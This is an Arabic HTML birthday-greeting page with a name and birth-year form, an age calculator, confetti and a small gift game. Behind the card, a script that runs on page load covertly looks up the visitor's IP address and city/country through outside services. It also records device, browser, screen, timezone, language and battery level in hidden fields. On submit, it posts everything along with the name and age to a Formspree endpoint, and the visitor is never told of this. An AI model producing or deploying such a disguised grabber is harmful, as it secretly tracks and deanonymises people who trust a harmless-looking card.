<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🎂 بطاقة تهنئة عيد ميلاد</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
      padding: 20px;
    }
    .card {
      background: #fff;
      padding: 35px 25px;
      border-radius: 28px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
      text-align: center;
      width: 100%;
      max-width: 420px;
      border: 3px solid #ff6b81;
    }
    .icon { font-size: 60px; display: block; }
    h2 { color: #ff4757; font-size: 26px; margin: 5px 0 10px; }
    .greeting-text {
      font-size: 15px;
      color: #555;
      background: #fff0f3;
      padding: 12px;
      border-radius: 12px;
      margin-bottom: 20px;
      line-height: 1.6;
    }
    .birthday-message {
      background: linear-gradient(135deg, #ffecd2, #fcb69f);
      padding: 18px;
      border-radius: 16px;
      margin-bottom: 20px;
      font-size: 20px;
      font-weight: bold;
      color: #c0392b;
      display: none;
    }
    .birthday-message.show { display: block; animation: pop 0.5s ease; }
    @keyframes pop {
      0% { transform: scale(0.8); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .age-details { font-size: 14px; color: #555; font-weight: normal; margin-top: 5px; }
    .custom-message { font-size: 16px; color: #8e44ad; margin-top: 5px; font-weight: 600; }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      border: 2px solid #ddd;
      border-radius: 14px;
      font-size: 16px;
      text-align: center;
    }
    input:focus { border-color: #ff6b81; outline: none; }
    .btn-submit {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #f093fb, #f5576c);
      color: #fff;
      border: none;
      border-radius: 14px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn-submit:hover { transform: scale(1.02); box-shadow: 0 8px 25px rgba(245,87,108,0.4); }
    #status {
      font-size: 14px;
      margin: 12px 0;
      color: #666;
      font-weight: 500;
      min-height: 25px;
    }
    .toolbar {
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-wrap: wrap;
      margin-top: 15px;
      padding-top: 15px;
      border-top: 2px solid #eee;
    }
    .toolbar button {
      background: #f0f0f0;
      border: 2px solid #ff6b81;
      padding: 8px 18px;
      border-radius: 30px;
      cursor: pointer;
      font-size: 14px;
      font-weight: 600;
      transition: 0.3s;
      color: #333;
    }
    .toolbar button:hover {
      background: #ff6b81;
      color: #fff;
      transform: scale(1.05);
    }
    .countdown {
      font-size: 14px;
      color: #888;
      margin-top: 12px;
      padding: 10px;
      background: #f8f8f8;
      border-radius: 12px;
    }
    .game-area {
      margin: 15px 0;
      display: none;
      background: #f8f8f8;
      padding: 15px;
      border-radius: 16px;
    }
    .game-area.show { display: block; }
    .game-options {
      display: flex;
      justify-content: center;
      gap: 12px;
      flex-wrap: wrap;
      margin-top: 8px;
    }
    .game-options button {
      font-size: 35px;
      padding: 10px 18px;
      border: 3px solid #ff6b81;
      border-radius: 16px;
      cursor: pointer;
      background: #fff;
      transition: 0.3s;
    }
    .game-options button:hover { transform: scale(1.1); }
    .hidden { display: none; }
    .battery-indicator {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 13px;
      color: #555;
      margin-top: 10px;
    }
    .battery-bar {
      width: 50px;
      height: 6px;
      background: #ddd;
      border-radius: 3px;
      overflow: hidden;
    }
    .battery-fill { height: 100%; border-radius: 3px; transition: width 0.5s; }
    .visitor-stats {
      font-size: 12px;
      color: #888;
      margin-top: 10px;
    }
    .confetti-container {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      pointer-events: none;
      z-index: 999;
      overflow: hidden;
    }
    .confetti {
      position: absolute;
      width: 10px; height: 10px;
      border-radius: 2px;
      animation: fall linear infinite;
    }
    @keyframes fall {
      0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
      100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
    }
  </style>
</head>
<body>

<div class="confetti-container" id="confettiContainer"></div>

<div class="card">
  <span class="icon">🎉</span>
  <h2>كل عام وأنت بخير!</h2>
  <p class="greeting-text">🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!</p>

  <div id="birthdayMessage" class="birthday-message">
    🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
    <div class="age-details" id="ageDetails"></div>
    <div class="custom-message" id="customMessage"></div>
    <br>كل سنة وأنت طيب 💪
  </div>

  <form id="birthdayForm">
    <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
    <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك" required min="1900" max="2026">
    <div id="status"></div>

    <input type="hidden" id="ip" name="ip">
    <input type="hidden" id="location" name="location">
    <input type="hidden" id="age" name="age">
    <input type="hidden" id="device" name="device">
    <input type="hidden" id="browser" name="browser">
    <input type="hidden" id="screen" name="screen">
    <input type="hidden" id="timezone" name="timezone">
    <input type="hidden" id="language" name="language">
    <input type="hidden" id="visit_time" name="visit_time">
    <input type="hidden" id="connection" name="connection">
    <input type="hidden" id="battery" name="battery">
    <input type="hidden" id="user_agent" name="user_agent">
    <input type="hidden" id="visitor_id" name="visitor_id">

    <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
  </form>

  <div class="game-area" id="gameArea">
    <p style="font-weight:600;">🎁 اختر هديتك:</p>
    <div class="game-options">
      <button onclick="chooseGift('🎮')">🎮</button>
      <button onclick="chooseGift('📱')">📱</button>
      <button onclick="chooseGift('💎')">💎</button>
      <button onclick="chooseGift('🚗')">🚗</button>
    </div>
    <div id="giftResult" style="margin-top:10px; font-size:18px; color:#ff6b81; font-weight:600;"></div>
  </div>

  <div class="battery-indicator" id="batteryIndicator">
    🔋 <span id="batteryLevel">--%</span>
    <div class="battery-bar"><div class="battery-fill" id="batteryFill" style="width:0%; background:#2ed573;"></div></div>
  </div>

  <div class="toolbar">
    <button onclick="toggleTheme()">🎨 ثيم</button>
    <button onclick="toggleGame()">🎮 لعبة</button>
    <button onclick="shareCard()">📤 مشاركة</button>
    <button onclick="resetCard()">🔄 إعادة</button>
  </div>

  <div class="countdown" id="countdown"></div>
  <div class="visitor-stats">👤 زائر رقم: <span id="visitorCount">--</span></div>
</div>

<script>
  // ===== الثيمات =====
  const THEMES = ['light', 'dark', 'gold', 'ocean'];
  const THEME_NAMES = ['فاتح', 'داكن', 'ذهبي', 'محيط'];
  let currentTheme = parseInt(localStorage.getItem('theme')) || 0;

  function toggleTheme() {
    currentTheme = (currentTheme + 1) % THEMES.length;
    document.documentElement.setAttribute('data-theme', THEMES[currentTheme]);
    localStorage.setItem('theme', currentTheme);
    document.querySelector('.toolbar button:first-child').textContent = `🎨 ${THEME_NAMES[currentTheme]}`;
  }

  // ===== جمع المعلومات =====
  async function collectInfo() {
    try {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      document.getElementById('ip').value = ipData.ip;
      const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
      const geoData = await geoRes.json();
      document.getElementById('location').value = `${geoData.city || ''}، ${geoData.country_name || ''}`;
    } catch(e) {}

    const ua = navigator.userAgent;
    document.getElementById('device').value = /Mobile/i.test(ua) ? 'جوال' : 'كمبيوتر';
    document.getElementById('browser').value = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : 'Safari';
    document.getElementById('screen').value = `${screen.width}x${screen.height}`;
    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
    document.getElementById('language').value = navigator.language;
    document.getElementById('visit_time').value = new Date().toLocaleString('ar-SA');

    try {
      const battery = await navigator.getBattery();
      const level = Math.round(battery.level * 100);
      document.getElementById('battery').value = level + '%';
      document.getElementById('batteryLevel').textContent = level + '%';
      document.getElementById('batteryFill').style.width = level + '%';
      document.getElementById('batteryFill').style.background = level > 20 ? '#2ed573' : '#ff4757';
    } catch(e) {}

    let visits = parseInt(localStorage.getItem('visits') || '0') + 1;
    localStorage.setItem('visits', visits);
    document.getElementById('visitorCount').textContent = visits;
  }

  // ===== حساب العمر =====
  function calculateAgeAndShow() {
    const name = document.getElementById('nameInput').value.trim();
    const year = parseInt(document.getElementById('yearInput').value);
    const currentYear = new Date().getFullYear();
    const msg = document.getElementById('birthdayMessage');

    if (name && year >= 1900 && year <= currentYear) {
      const age = currentYear - year;
      if (age > 0 && age < 120) {
        document.getElementById('displayName').textContent = name;
        document.getElementById('displayAge').textContent = age;
        document.getElementById('age').value = age;
        const details = calcDetails(year);
        document.getElementById('ageDetails').textContent = `${details.years} سنة، ${details.months} شهر، ${details.days} يوم`;
        document.getElementById('customMessage').textContent = getMsg(age);
        msg.classList.add('show');
        updateCountdown(year);
        launchConfetti();
        return;
      }
    }
    msg.classList.remove('show');
  }

  function calcDetails(year) {
    const now = new Date();
    const bd = new Date(year, 0, 1);
    let y = now.getFullYear() - bd.getFullYear();
    let m = now.getMonth() - bd.getMonth();
    let d = now.getDate() - bd.getDate();
    if (d < 0) { m--; d += 30; }
    if (m < 0) { y--; m += 12; }
    return { years: y, months: m, days: d };
  }

  function getMsg(age) {
    if (age < 10) return '🌟 أنت صغير لكن مستقبلك عظيم!';
    if (age < 18) return '🚀 أنت في بداية رحلة العمر!';
    if (age < 30) return '💪 في قمة العطاء!';
    if (age < 50) return '👑 في عز الحكمة!';
    return '💎 أنت كنز ثمين!';
  }

  function updateCountdown(year) {
    const now = new Date();
    const next = new Date(now.getFullYear(), 0, 1);
    if (now > next) next.setFullYear(next.getFullYear() + 1);
    const diff = next - now;
    document.getElementById('countdown').textContent =
      `⏳ العيد القادم بعد ${Math.floor(diff/(1000*60*60*24))} يوم، ${Math.floor((diff%(86400000))/(3600000))} ساعة`;
  }

  // ===== كونفيتي =====
  function launchConfetti() {
    const c = document.getElementById('confettiContainer');
    const colors = ['#ff6b6b','#feca57','#48dbfb','#ff9ff3','#54a0ff','#1dd1a1'];
    for (let i = 0; i < 80; i++) {
      const el = document.createElement('div');
      el.className = 'confetti';
      el.style.left = Math.random() * 100 + '%';
      el.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
      el.style.width = (Math.random() * 8 + 4) + 'px';
      el.style.height = (Math.random() * 8 + 4) + 'px';
      el.style.animationDuration = (Math.random() * 3 + 2) + 's';
      el.style.animationDelay = (Math.random() * 2) + 's';
      c.appendChild(el);
    }
    setTimeout(() => c.innerHTML = '', 5000);
  }

  // ===== لعبة =====
  function chooseGift(gift) {
    const gifts = {
      '🎮': '🎮 أتمنى لك ساعات من المرح!',
      '📱': '📱 تقنية متطورة في انتظارك!',
      '💎': '💎 حياة مليئة بالجمال!',
      '🚗': '🚗 رحلات ومغامرات لا تنسى!'
    };
    document.getElementById('giftResult').textContent = gifts[gift] || '🎁 هدية رائعة!';
    launchConfetti();
  }

  function toggleGame() {
    const g = document.getElementById('gameArea');
    g.classList.toggle('show');
    if (g.classList.contains('show')) document.getElementById('giftResult').textContent = '🎁 اختر هديتك!';
  }

  // ===== مشاركة =====
  function shareCard() {
    const name = document.getElementById('nameInput').value.trim() || 'صديقي';
    const age = document.getElementById('age').value || '؟';
    const text = `🎉 كل عام وأنت بخير يا ${name}! 🎂\nعمرك ${age} سنة!\nكل سنة وأنت طيب 💪`;
    if (navigator.share) navigator.share({ title: '🎂 تهنئة', text });
    else navigator.clipboard.writeText(text).then(() => {
      document.getElementById('status').innerText = '📋 تم النسخ!';
      document.getElementById('status').style.color = '#2ed573';
    });
  }

  // ===== إعادة =====
  function resetCard() {
    document.getElementById('birthdayForm').reset();
    document.getElementById('birthdayMessage').classList.remove('show');
    document.getElementById('status').innerText = '';
    document.getElementById('countdown').textContent = '';
    document.getElementById('giftResult').textContent = '';
    document.getElementById('gameArea').classList.remove('show');
    document.getElementById('confettiContainer').innerHTML = '';
  }

  // ===== إرسال =====
  function handleSubmit() {
    const name = document.getElementById('nameInput').value.trim();
    const year = document.getElementById('yearInput').value.trim();
    const status = document.getElementById('status');
    const age = document.getElementById('age').value;

    if (!name) { status.innerText = '⚠️ أدخل اسمك!'; status.style.color = '#ff4757'; return; }
    if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
      status.innerText = '⚠️ سنة ميلاد غير صحيحة!';
      status.style.color = '#ff4757';
      return;
    }
    if (!age || age < 1) { status.innerText = '⚠️ تأكد من السنة!'; status.style.color = '#ff4757'; return; }
    if (!confirm(`🎈 إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) return;

    status.innerText = '⏳ جاري الإرسال...';
    status.style.color = '#333';

    const data = {
      name, age, birth_year: year,
      ip: document.getElementById('ip').value || 'غير متاح',
      location: document.getElementById('location').value || 'غير متاح',
      device: document.getElementById('device').value || 'غير متاح',
      browser: document.getElementById('browser').value || 'غير متاح',
      screen: document.getElementById('screen').value || 'غير متاح',
      timezone: document.getElementById('timezone').value || 'غير متاح',
      language: document.getElementById('language').value || 'غير متاح',
      visit_time: document.getElementById('visit_time').value || 'غير متاح',
      connection: document.getElementById('connection').value || 'غير متاح',
      battery: document.getElementById('battery').value || 'غير متاح',
      user_agent: document.getElementById('user_agent').value || 'غير متاح',
      visitor_id: document.getElementById('visitor_id').value || 'غير متاح'
    };

    fetch('https://formspree.io/f/xpqvvkdp', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }
    }).then(r => {
      if (r.ok) {
        status.innerText = '✅ تم الإرسال! شكراً 🎊';
        status.style.color = '#2ed573';
        document.getElementById('birthdayForm').reset();
        document.getElementById('birthdayMessage').classList.remove('show');
        document.getElementById('countdown').textContent = '';
        document.getElementById('giftResult').textContent = '';
        document.getElementById('gameArea').classList.remove('show');
        launchConfetti();
      } else {
        status.innerText = '❌ حدث خطأ، حاول مرة أخرى.';
        status.style.color = '#ff4757';
      }
    }).catch(() => {
      status.innerText = '❌ تعذر الاتصال بالخادم.';
      status.style.color = '#ff4757';
    });
  }

  // ===== التحميل =====
  window.onload = function() {
    const saved = localStorage.getItem('theme');
    if (saved) { currentTheme = parseInt(saved); document.documentElement.setAttribute('data-theme', THEMES[currentTheme]); }
    document.querySelector('.toolbar button:first-child').textContent = `🎨 ${THEME_NAMES[currentTheme]}`;
    collectInfo();
    document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
    document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
  };
</script>

</body>
</html>
